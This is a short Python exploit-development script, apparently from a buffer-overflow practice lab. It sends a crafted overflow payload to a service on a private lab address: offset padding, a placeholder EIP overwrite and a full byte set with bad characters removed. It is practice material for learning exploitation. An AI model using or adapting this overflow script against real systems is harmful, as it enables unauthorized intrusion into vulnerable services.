#!/usr/bin/env python3

import socket

host, port = "10.10.154.224", 1337 # CHANGE THIS.

all_chars = bytearray(range(1,256))

bad_chars = [ # CHANGE THIS.
	b"\x11",
	b"\x40",
	b"\x5f",
	b"\xb8",
	b"\xee",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW3 " # CHANGE THIS.
length = 1500 # CHANGE THIS.
offset = 1274 # CHANGE THIS.
new_eip = b"BBBB"

payload = b"".join(
	[
		command,
		b"A" * offset,
		new_eip,
		all_chars,
		b"C" * ( length - len(new_eip) - offset - len(all_chars)),
	]
)

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)